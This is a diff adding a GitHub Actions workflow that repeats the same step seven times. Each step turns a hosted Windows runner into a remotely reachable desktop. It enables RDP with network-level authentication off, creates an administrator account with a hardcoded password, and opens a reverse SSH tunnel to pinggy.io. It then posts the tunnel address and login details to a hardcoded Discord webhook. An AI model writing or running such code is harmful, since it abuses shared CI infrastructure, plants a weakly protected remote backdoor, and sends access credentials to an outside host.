@@ -1,0 +1,149 @@
+name: Windows RDP
+
+on:
+  workflow_dispatch:
+
+jobs:
+  rdp-1:
+    runs-on: windows-latest
+    timeout-minutes: 100000
+    steps:
+      - name: FULL SETUP
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Stop-Process -Name "ssh" -ErrorAction SilentlyContinue
+          Start-Process -FilePath "ssh" -ArgumentList "-o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io" -RedirectStandardOutput "pinggy.log" -RedirectStandardError "pinggy_err.log" -NoNewWindow
+          Start-Sleep -Seconds 15
+          $log = (Get-Content "pinggy.log" -ErrorAction SilentlyContinue) + (Get-Content "pinggy_err.log" -ErrorAction SilentlyContinue) -join "`n"
+          $match = [regex]::Match($log, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
+          $clean = $match.Value -replace 'tcp://',''
+          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 3000
+
+      - name: FULL SETUP 2
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Stop-Process -Name "ssh" -ErrorAction SilentlyContinue
+          Start-Process -FilePath "ssh" -ArgumentList "-o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io" -RedirectStandardOutput "pinggy.log" -RedirectStandardError "pinggy_err.log" -NoNewWindow
+          Start-Sleep -Seconds 15
+          $log = (Get-Content "pinggy.log" -ErrorAction SilentlyContinue) + (Get-Content "pinggy_err.log" -ErrorAction SilentlyContinue) -join "`n"
+          $match = [regex]::Match($log, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
+          $clean = $match.Value -replace 'tcp://',''
+          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 3000
+
+      - name: FULL SETUP 3
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Stop-Process -Name "ssh" -ErrorAction SilentlyContinue
+          Start-Process -FilePath "ssh" -ArgumentList "-o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io" -RedirectStandardOutput "pinggy.log" -RedirectStandardError "pinggy_err.log" -NoNewWindow
+          Start-Sleep -Seconds 15
+          $log = (Get-Content "pinggy.log" -ErrorAction SilentlyContinue) + (Get-Content "pinggy_err.log" -ErrorAction SilentlyContinue) -join "`n"
+          $match = [regex]::Match($log, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
+          $clean = $match.Value -replace 'tcp://',''
+          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 3000
+
+      - name: FULL SETUP 4
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Stop-Process -Name "ssh" -ErrorAction SilentlyContinue
+          Start-Process -FilePath "ssh" -ArgumentList "-o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io" -RedirectStandardOutput "pinggy.log" -RedirectStandardError "pinggy_err.log" -NoNewWindow
+          Start-Sleep -Seconds 15
+          $log = (Get-Content "pinggy.log" -ErrorAction SilentlyContinue) + (Get-Content "pinggy_err.log" -ErrorAction SilentlyContinue) -join "`n"
+          $match = [regex]::Match($log, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
+          $clean = $match.Value -replace 'tcp://',''
+          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 3000
+
+      - name: FULL SETUP 5
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Stop-Process -Name "ssh" -ErrorAction SilentlyContinue
+          Start-Process -FilePath "ssh" -ArgumentList "-o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io" -RedirectStandardOutput "pinggy.log" -RedirectStandardError "pinggy_err.log" -NoNewWindow
+          Start-Sleep -Seconds 15
+          $log = (Get-Content "pinggy.log" -ErrorAction SilentlyContinue) + (Get-Content "pinggy_err.log" -ErrorAction SilentlyContinue) -join "`n"
+          $match = [regex]::Match($log, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
+          $clean = $match.Value -replace 'tcp://',''
+          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 3000
+
+      - name: FULL SETUP 6
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Stop-Process -Name "ssh" -ErrorAction SilentlyContinue
+          Start-Process -FilePath "ssh" -ArgumentList "-o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io" -RedirectStandardOutput "pinggy.log" -RedirectStandardError "pinggy_err.log" -NoNewWindow
+          Start-Sleep -Seconds 15
+          $log = (Get-Content "pinggy.log" -ErrorAction SilentlyContinue) + (Get-Content "pinggy_err.log" -ErrorAction SilentlyContinue) -join "`n"
+          $match = [regex]::Match($log, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
+          $clean = $match.Value -replace 'tcp://',''
+          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 3000
+
+      - name: FULL SETUP 7
+        shell: pwsh
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
+          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
+          Stop-Process -Name "ssh" -ErrorAction SilentlyContinue
+          Start-Process -FilePath "ssh" -ArgumentList "-o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io" -RedirectStandardOutput "pinggy.log" -RedirectStandardError "pinggy_err.log" -NoNewWindow
+          Start-Sleep -Seconds 15
+          $log = (Get-Content "pinggy.log" -ErrorAction SilentlyContinue) + (Get-Content "pinggy_err.log" -ErrorAction SilentlyContinue) -join "`n"
+          $match = [regex]::Match($log, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
+          $clean = $match.Value -replace 'tcp://',''
+          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+          Start-Sleep -Seconds 3000
